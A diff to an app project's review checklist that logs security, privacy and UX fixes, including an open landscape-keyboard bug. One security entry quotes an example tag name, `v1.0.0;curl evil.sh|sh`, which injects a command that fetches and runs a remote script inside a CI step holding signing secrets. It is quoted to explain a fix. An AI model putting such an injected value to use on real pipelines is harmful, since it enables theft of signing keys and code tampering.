@@ -232,17 +232,74 @@ is left.
 
 **Security / privacy** (nothing critical; full details in the review)
 
-- [ ] Read-only path writes the whole converted message to the clipboard without
-      `ClipDescription.EXTRA_IS_SENSITIVE`, so Android 13+ shows a content
-      preview.
-- [ ] README Privacy says "no network calls" and does not mention that settings
-      now leave the device via Android Auto Backup. True as written; incomplete.
-- [ ] `android-release.yml` interpolates a tag name unquoted into a `run:` block
-      that holds the signing keystore. `ios-release.yml` already does this
-      correctly — copy that.
+- [x] ~~Read-only path writes the whole converted message to the clipboard without
+      `ClipDescription.EXTRA_IS_SENSITIVE`.~~ **Set 2026-07-26.** No API guard: it
+      is a compile-time String constant, so it inlines and is ignored below 33.
+      ⚠️ **Static verification only** — `dumpsys clipboard` returns nothing on
+      Android 13+, so the flag cannot be observed from a shell. The code path was
+      exercised (read-only intent, no crash); the suppression itself was not.
+- [x] ~~README Privacy does not mention Android Auto Backup.~~ **Fixed 2026-07-26**
+      — states plainly that the OS copies the zone list off the device even though
+      the app has no Internet permission, links both rules files, and gives the two
+      ways to opt out.
+- [x] ~~`android-release.yml` interpolates a tag name into a `run:` block that holds
+      the signing keystore.~~ **Fixed 2026-07-26.** Confirmed real: git permits
+      `; $ \` ( )` in a tag, so `v1.0.0;curl evil.sh|sh` became a command in the one
+      step holding the decoded keystore and all four signing secrets. Now passed via
+      `env:` and quoted at point of use (the `ios-release.yml` pattern), plus
+      `set -euo pipefail`, plus a second lock: the version step refuses any tag not
+      matching `^[A-Za-z0-9._+-]+$` rather than sanitising it.
 
-**UX**, from a real emulator session (everything changed in the icon/backup work
-verified PASS; these are pre-existing)
+**UX** — all verified on a live AVD. Layout claims are checked against
+**screenshots**; the accessibility tree turned out to be an unreliable oracle in
+both directions (see the landscape entry).
+
+- [x] ~~Launcher icon has zero safe-zone margin.~~ **Fixed 2026-07-26.** The
+      artwork is a 72-wide clock drawn in its own 0..72 space, so translating by 18
+      put the ring exactly on the safe-zone boundary. Scaled 0.83 about its own
+      centre → ~60 diameter, ~6 of margin on every side, inside Material's 66
+      keyline. Verified on the launcher: the ring now sits clear of the mask edge.
+- [x] ~~Every search result is listed twice (once under "Common", once under
+      "All").~~ **Fixed 2026-07-26**, and it dragged two more bugs out with it:
+      the "All" header printed even with nothing beneath it, and "no matches" was
+      keyed off the All list alone so it could claim nothing matched while matching
+      rows sat directly above. Verified: `york` → exactly one New York row.
+- [ ] 🔴 **Zone picker unusable in landscape with the keyboard up.** **Attempted
+      twice, both attempts made it worse, both reverted.** Recording the findings
+      because they are most of the work:
+      - `imePadding()` is silently a **no-op inside a Compose `Dialog`** here.
+        `WindowInsets.ime` stays zero, and neither `decorFitsSystemWindows = false`
+        nor `SOFT_INPUT_ADJUST_RESIZE` on the dialog's own window changed that.
+      - Attempt 2 shrank the dialog instead. There is ~270px above a landscape
+        keyboard; title (74) + field (125) fills it, so the list got **zero** height
+        and the footer Cancel was clipped off entirely — trading "Cancel is behind
+        the keyboard" for "there is no list and no Cancel at all".
+      - Measured with rows laid out at **y=380..851 against a keyboard top of ~390**:
+        present in the accessibility tree, and **inert when tapped**. The a11y tree
+        lists occluded nodes, so "the row is there" was a false positive; the tap
+        test is what caught it.
+      - **The fix is to stop being a `Dialog`** — a full screen/route owns its
+        insets. That is a structural change, not a polish item.
+- [x] ~~The false-positive decline reuses the no-detection string.~~ **Partly fixed,
+      and the item was aimed at the wrong input** (the same way `half past 5` was).
+      `use 12 pt font` contains no time, so "No time found" was *correct* there. The
+      real defect is the **deliberate declines**, which are indistinguishable from
+      it because `detectLast` returns null for both: `half past 5pm ET`, `1700 ET`,
+      `call me at 5 ET`, `meet 7pm NPT`, and worst, `Standup is *5pm* CT` — where the
+      user wrote a perfectly good time and zone, markup defeated the match, and the
+      app replied "try 5pm CT". The string no longer asserts anything false, but
+      telling the two apart needs a **decline reason out of `TimeParser` in both
+      cores** plus corpus rows. Owner call: that is core work with a product decision
+      attached (what to say per decline class), not a string change.
+- [x] ~~No prominent disclosure before the contacts permission dialog.~~ **Fixed
+      2026-07-26.** The existing rationale dialog only ever appeared *after* a
+      denial, so nothing explained contacts access up front — and by then the user
+      has spent their one re-ask. New disclosure states what is read (country codes
+      only), that it happens on-device, that there is no Internet permission, and
+      that declining costs nothing. Verified: it appears on tap, the system dialog
+      has **not** been shown at that point, and Continue reaches it.
+
+**UX (earlier findings)**
 
 - [x] ~~🔴 **Intermittent stale settings UI.**~~ **Fixed and measured 2026-07-26.**
       The diagnosis was right: `targetZonesFlow()` returned `dataStore.data.map { … }`,
@@ -276,15 +333,10 @@ verified PASS; these are pre-existing)
         that remove still propagates and does not take the other zones with it —
         neither race probe could have caught a broken remove, because a remove that
         does nothing leaves the zone on screen, which reads as success.
-- [ ] Launcher icon has **zero safe-zone margin** — the clock ring sits exactly
-      on the mask boundary, so it reads as a bordered tile and will clip under
-      any mask tighter than Pixel's circle.
-- [ ] Zone picker is unusable in landscape with the keyboard up: the IME covers
-      the result list *and* Cancel.
-- [ ] Every search result is listed twice (once under "Common", once under "All").
-- [ ] The false-positive decline reuses the no-detection string, so `use 12 pt
-      font` invites a retry instead of saying it declined.
-- [ ] No prominent disclosure before the contacts permission dialog (bears on D1).
+The other five items from that emulator session — icon safe zone, landscape +
+IME, duplicate search results, the decline message, and the contacts disclosure —
+are in the **UX** block above, where their outcomes are recorded. Four are fixed;
+the landscape one is still open and says why.
 
 ### 5. Parser gaps that still mislead
 
